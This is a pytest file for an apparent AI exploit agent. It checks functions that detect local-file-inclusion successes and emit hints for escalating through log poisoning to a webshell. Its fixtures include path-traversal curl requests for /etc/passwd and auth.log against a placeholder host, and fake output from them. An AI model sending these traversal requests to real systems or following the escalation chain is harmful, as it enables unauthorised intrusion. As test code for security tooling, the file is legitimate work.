"""Unit tests for E1/E4: _build_log_poison_pivot_hint + _build_findings_summary triggers."""
from __future__ import annotations

import pytest

pytest.importorskip("openai")  # exploit_agent transitively imports openai
pytest.importorskip("langgraph", reason="state deps")

from backend.agents.exploit_agent import (  # noqa: E402
    _build_findings_summary,
    _build_log_poison_pivot_hint,
)


# /etc/passwd fixture to trip _passwd_content_detected
_PASSWD_OUT = (
    "root:x:0:0:root:/root:/bin/bash\n"
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
    "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
)

# auth.log content with typical sshd failed login lines
_AUTH_LOG_OUT = (
    "Nov 25 10:12:33 host sshd[1234]: Invalid user admin from 1.2.3.4 port 33445\n"
    "Nov 25 10:12:35 host sshd[1234]: Failed password for invalid user admin from 1.2.3.4\n"
    "Nov 25 10:12:37 host sshd[1234]: Connection closed by 1.2.3.4 port 33445 [preauth]\n"
) * 3  # make sure len > 50


def _rec(cmd: str, stdout: str, rnd: int = 1) -> dict:
    return {"command": cmd, "stdout": stdout, "round": rnd}


def test_findings_summary_emits_lfi_and_logs_triggers():
    records = [
        _rec("curl 'http://t/?p=../../etc/passwd'", _PASSWD_OUT),
        _rec("curl 'http://t/?p=../../var/log/auth.log'", _AUTH_LOG_OUT),
    ]
    summary = _build_findings_summary(records)
    assert "[LFI confirmed]" in summary
    assert "[Log file readable]" in summary
    assert "[TRIGGER] lfi_confirmed: true" in summary
    assert "[TRIGGER] logs_readable:" in summary
    assert "auth.log" in summary.split("[TRIGGER] logs_readable:", 1)[1]


def test_findings_summary_webshell_lang_from_header():
    out = "HTTP/1.1 200 OK\nX-Powered-By: PHP/7.4.3\nServer: Apache\n\nhello"
    records = [_rec("curl -I http://t/", out)]
    summary = _build_findings_summary(records)
    # Only webshell_lang trigger, no lfi yet
    if summary:
        assert "webshell_lang:" in summary or summary == ""


def test_pivot_hint_fires_when_lfi_and_logs_readable():
    records = [
        _rec("curl 'http://t/?p=../../../etc/passwd'", _PASSWD_OUT),
        _rec("curl 'http://t/?p=../../../var/log/auth.log'", _AUTH_LOG_OUT),
    ]
    hint = _build_log_poison_pivot_hint(records)
    assert "日志投毒" in hint or "log" in hint.lower()
    assert "hydra" not in hint.lower() or "禁止" in hint or "不要" in hint
    assert "auth.log" in hint


def test_pivot_hint_empty_without_lfi():
    records = [_rec("curl 'http://t/?p=../../var/log/auth.log'", _AUTH_LOG_OUT)]
    assert _build_log_poison_pivot_hint(records) == ""


def test_pivot_hint_empty_when_rce_already_confirmed():
    records = [
        _rec("curl 'http://t/?p=../../etc/passwd'", _PASSWD_OUT),
        _rec("curl 'http://t/?p=../../var/log/auth.log'", _AUTH_LOG_OUT),
        _rec("trigger poison", "uid=33(www-data) gid=33(www-data)"),
    ]
    assert _build_log_poison_pivot_hint(records) == ""


def test_pivot_hint_picks_jsp_when_detected():
    # jsessionid in earlier output → webshell_lang=jsp
    out_with_jsp = (
        "HTTP/1.1 200 OK\nSet-Cookie: JSESSIONID=ABC123\nServer: Apache Tomcat/9.0\n\nhello"
    )
    records = [
        _rec("curl -I http://t/app", out_with_jsp),
        _rec("curl 'http://t/?p=../../etc/passwd'", _PASSWD_OUT),
        _rec("curl 'http://t/?p=../../var/log/auth.log'", _AUTH_LOG_OUT),
    ]
    hint = _build_log_poison_pivot_hint(records)
    assert "jsp" in hint.lower() or "runtime.getruntime" in hint.lower()
